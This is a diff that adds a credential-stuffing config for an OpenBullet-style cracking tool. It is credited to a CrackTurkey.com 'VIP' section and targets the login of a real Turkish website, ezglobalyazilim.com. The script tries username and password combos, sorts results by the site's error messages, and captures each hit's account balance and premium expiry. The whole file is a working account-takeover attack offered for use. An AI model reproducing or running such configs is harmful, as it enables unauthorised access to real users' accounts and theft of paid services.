@@ -1,0 +1,88 @@
+[SETTINGS]
+{
+  "Name": "EzGlobal",
+  "SuggestedBots": 30,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-23T12:08:57.1957093+03:00",
+  "AdditionalInfo": "eam tarafından CrackTurkey.com VIP Bölüme özel kodlanmıştır",
+  "Author": " e a m",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#CrackTurkey REQUEST POST "https://www.ezglobalyazilim.com/ajax.php" 
+  CONTENT "s1=uyelik&s2=islem&islem=gir&refuser=0&eposta=<USER>&sifre=<PASS>&ajtip=eval" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CrackTurkey KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "E-Posta adresi veya şifre hatalıdır" 
+    KEY "Şifre 5 karakterden küçük veya 15 karakterden büyük olamaz." 
+    KEY "Şifre yalnızca harf ve rakamlardan oluşabilir" 
+    KEY "Lütfen geçerli bir e-posta adresi girin" 
+    KEY "Form verilerinde boşluk kullanılamaz" 
+    KEY "Formda eksik veri bulunmaktadır" 
+  KEYCHAIN Success OR 
+    KEY "'Üye girişi başarılı'" 
+
+#CrackTurkey REQUEST GET "https://www.ezglobalyazilim.com/hesabim/premium.html" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CrackTurkey PARSE "<SOURCE>" LR "<li class=\"bakiye\">" "</li>" CreateEmpty=FALSE -> CAP "Bakiye" 
+
+#CrackTurkey PARSE "<SOURCE>" LR "<div class=\"fsize-24 fweight-700 font-agency color-white uppercase\">" "." CreateEmpty=FALSE -> CAP "Premium Süresi" 
+
+#CrackTurkey KEYCHECK 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<Premium Süresi>" Contains "Bulunmamaktadır" 
+    KEY "<Bakiye>" EqualTo "0,00 TL" 
+  KEYCHAIN Success OR 
+    KEY "<Premium Süresi>" DoesNotContain "Bulunmamaktadır" 
+    KEY "<Bakiye>" NotEqualTo "0,00 TL" 
+
